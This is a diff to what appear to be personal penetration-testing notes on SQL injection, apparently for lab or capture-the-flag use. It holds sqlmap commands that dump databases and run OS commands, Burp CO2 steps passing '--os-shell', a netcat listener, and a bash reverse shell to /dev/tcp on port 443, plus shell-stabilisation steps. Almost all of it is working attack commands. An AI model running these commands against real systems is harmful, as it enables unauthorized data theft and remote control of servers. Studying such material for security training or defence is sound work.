@@ -295,13 +295,28 @@ admin’;--
 
 # sqlmap
 
-- Use a target page
-sqlmap -u "http://target/index.html?page=1" --dbs --dump --batch
-
-- Use Burp, turn the Proxy intercept on.
+- Burp
+Extender > BAppStore > CO2 > Install
+Proxy > Intercept > turn on intercept.
 Send a form request with no data using the browser.
-Capture the request, right-click on the POST > Copy to file: tmp
+Right-click on the captured request > Extension > CO2 > Send to SQLMapper
+CO2 > Config > SQLMap Path: /usr/bin/sqlmap > OK
+Extra SQLMapper Params: --os-shell
+Run
 
+- If you get a shell
+nc -lvnp 443
+
+os-shell> bash -c "bash -i >& /dev/tcp/10.10.16.5/443 0>&1"
+
+python3 -V
+python3 -c 'import pty;pty.spawn("bash")'
+ctrl Z
+stty raw -echo; fg
+cd ~
+
+- Burp 2
+Save the captured request to a file called tmp.
 
 sqlmap.py -r tmp --force-ssl --batch --dbs --dump
 sqlmap.py -r tmp --force-ssl --batch -D <database> --tables
@@ -309,14 +324,4 @@ sqlmap.py -r tmp --force-ssl --batch -D <database> -T <table> --dump
 sqlmap.py -r tmp --force-ssl --batch --os-cmd whoami
 sqlmap.py -r tmp --force-ssl --batch --os-cmd id
 sqlmap.py -r tmp --force-ssl --batch --os-shell
-
-os-shell> bash -c "bash -i >& /dev/tcp/10.0.0.5/443 0>&1"
-
-- Kali
-nc -lvpn 443
-python3 -V
-python3 -c 'import pty;pty.spawn("bash")'
-ctrl Z
-stty raw -echo; fg
-cd ~
 
